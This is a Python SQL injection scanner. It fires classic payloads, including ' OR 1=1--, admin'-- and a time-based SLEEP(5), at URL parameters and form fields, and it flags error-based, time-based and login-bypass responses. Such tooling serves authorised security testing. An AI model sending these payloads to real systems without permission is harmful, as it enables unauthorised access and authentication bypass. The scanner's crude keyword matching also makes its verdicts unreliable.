import requests
import time
from urllib.parse import urlparse, parse_qs, urlencode, urljoin, urlunparse
from bs4 import BeautifulSoup

# Payloads
payloads = [
    "'",
    "' OR 1=1--",
    "' OR '1'='1",
    "admin'--"
]

time_payload = "' OR SLEEP(5)--"


def inject_payload(url, param, payload):
    parsed = urlparse(url)
    query = parse_qs(parsed.query)
    query[param] = payload
    new_query = urlencode(query, doseq=True)
    return urlunparse((parsed.scheme, parsed.netloc, parsed.path, '', new_query, ''))


def detect_sql_injection(url):
    try:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        # =========================
        # 🔹 URL PARAM SCAN
        # =========================
        if params:
            report = "\n=== SQL INJECTION REPORT ===\n\n"
            report += f"Target: {url}\n\n"

            for param in params:
                report += f"[PARAMETER] {param}\n"

                vulnerable = False

                for payload in payloads:
                    test_url = inject_payload(url, param, payload)
                    res = requests.get(test_url, timeout=5).text.lower()

                    if any(e in res for e in ["sql", "mysql", "syntax", "error"]):
                        vulnerable = True

                if vulnerable:
                    report += "[!] Possible SQL Injection detected\n\n"
                else:
                    report += "[✓] No obvious SQL Injection detected (basic tests)\n\n"

            return {"Result": report.strip()}

        # =========================
        # 🔹 FORM SCAN
        # =========================
        response = requests.get(url, timeout=5)
        soup = BeautifulSoup(response.text, "html.parser")

        forms = soup.find_all("form")

        if not forms:
            return {"Error": "No parameters or forms found"}

        report = "\n=== SQL INJECTION REPORT (FORM SCAN) ===\n\n"
        report += f"Target: {url}\n\n"

        for form in forms:
            action = form.get("action")
            method = form.get("method", "get").lower()

            form_url = urljoin(url, action) if action else url

            inputs = form.find_all("input")
            field_names = [inp.get("name") for inp in inputs if inp.get("name")]

            if not field_names:
                continue

            report += f"[FORM] Method: {method.upper()} | Action: {form_url}\n"
            report += f"[FIELDS] {', '.join(field_names)}\n"

            vulnerable = False
            bypass_detected = False

            # 🔹 Identify if it's a login form
            login_keywords = ["login", "user", "pass", "auth"]
            is_login_form = any(k in " ".join(field_names).lower() for k in login_keywords)

            # 🔹 Baseline request
            normal_data = {name: "test" for name in field_names}

            try:
                if method == "post":
                    normal_res = requests.post(form_url, data=normal_data, timeout=5)
                else:
                    normal_res = requests.get(form_url, params=normal_data, timeout=5)

                normal_text = normal_res.text
            except:
                normal_text = ""

            # 🔹 Payload testing
            for payload in payloads:
                data = {name: payload for name in field_names}

                try:
                    if method == "post":
                        res = requests.post(form_url, data=data, timeout=5)
                    else:
                        res = requests.get(form_url, params=data, timeout=5)

                    content = res.text.lower()

                    # ERROR-based detection
                    if any(e in content for e in ["sql", "mysql", "syntax", "error"]):
                        vulnerable = True

                    # AUTH BYPASS (only for login forms)
                    if is_login_form:
                        if normal_text and res.text != normal_text:
                            if any(keyword in content for keyword in [
                                "logout", "dashboard", "welcome", "account", "balance"
                            ]):
                                bypass_detected = True

                except:
                    continue

            # 🔹 TIME-based detection
            try:
                start = time.time()

                if method == "post":
                    requests.post(form_url, data={name: time_payload for name in field_names}, timeout=10)
                else:
                    requests.get(form_url, params={name: time_payload for name in field_names}, timeout=10)

                if time.time() - start > 4:
                    vulnerable = True
            except:
                pass

            # 🔹 RESULT
            if bypass_detected:
                report += "[!] Possible Authentication Bypass detected\n"
                report += "Severity: CRITICAL\n\n"
            elif vulnerable:
                report += "[!] Possible SQL Injection detected\n"
                report += "Severity: HIGH\n\n"
            else:
                report += "[✓] No obvious SQL Injection detected (basic tests)\n\n"

        return {"Result": report.strip()}

    except requests.exceptions.Timeout:
        return {"Error": "Request timed out"}

    except Exception as e:
        return {"Error": str(e)}